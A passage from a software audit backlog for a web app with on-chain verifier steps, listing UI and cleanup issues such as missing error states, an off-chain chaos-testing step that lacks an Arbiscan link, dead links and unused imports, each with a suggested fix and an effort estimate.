**Source:** wave2-e2e E2E-46, E2E-48–E2E-50 · **Files:** `transfer-form.tsx`, `order-form.tsx`, `notifications/list.tsx`, `reserves/stat-row.tsx`, `agents/stat-row.tsx`, `cohort-grid.tsx`, `landing/numbers-section.tsx`, `landing/subsystems-section.tsx`
**Impact:** User cannot distinguish "loading" from "failed." Violates ui.md: "Error state (named cause, action to retry)."
**Fix:** Distinguish loading / empty / error in each fetcher's return shape. The pattern from `open-positions-table.tsx` ("Could not load positions" with retry) is the correct one to copy.
**Effort:** M (4h covering 8 components)

### H-074 · Verifier step 4 (chaos) produces no tx hash — breaks "every step has Arbiscan link" rule
**Source:** wave2-product P-13 · **File:** `verifier-step-runner.tsx:130`
**Impact:** PRD §26.1 requires each step to "produce a real tx hash with Arbiscan link." Chaos is off-chain, so this step cannot. Judges expect 7 Arbiscan links and find 6.
**Fix:** Either (a) add a `ChaosEvent` event to a contract so step 4 produces a real tx hash, or (b) add an inline disclosure on step 4: "Off-chain fault injection — no on-chain tx by design."
**Effort:** S (15 min disclosure) or M (4h on-chain event)

### H-075 · No chaos button on any verifier step page
**Source:** wave2-e2e E2E-02 · **Files:** all `/verify/[step]` pages except step 4
**Impact:** ui.md says "Chaos Mode button injects a random fault" — implying it's available throughout the flow. Today, chaos is only on `/chaos`. Judges expect to click chaos mid-demo and see graceful degradation.
**Fix:** Add a chaos sidebar button on each verifier step page. Wire to `/api/chaos/inject` with `mode=random`.
**Effort:** M (2h)

## Frontend · dead CTAs · cleanup

### H-076 · 6 dead `href="#"` links across MobileApp, DesktopApp, MobileLanding
**Source:** O-17, wave2-e2e E2E-55 · **Files:** `MobileApp.tsx` (4), `DesktopApp.tsx` (1), `MobileLanding.tsx` (1)
**Impact:** "All ↗" and "New ↗" links go nowhere. Visible on every render of those Lovable-port components.
**Fix:** Wire each to a real destination, OR remove the link styling. The Lovable-port components should ideally be deleted entirely (they're hidden by CSS but still in the bundle and SSR'd).
**Effort:** S (15 min)

### H-077 · 21 unused `Wordmark` imports across marketing pages
**Source:** O-18, wave1-launch L-38, L-39 · **Files:** privacy, terms, security, manifesto, team, changelog, cohort/, etc.
**Impact:** Dead imports across 8+ files. Signals sloppy code to reviewers.
**Fix:** Remove all unused `import { Wordmark } from '@/components/wordmark'` lines. ESLint should catch this; add the rule if not enabled.
**Effort:** S (10 min)

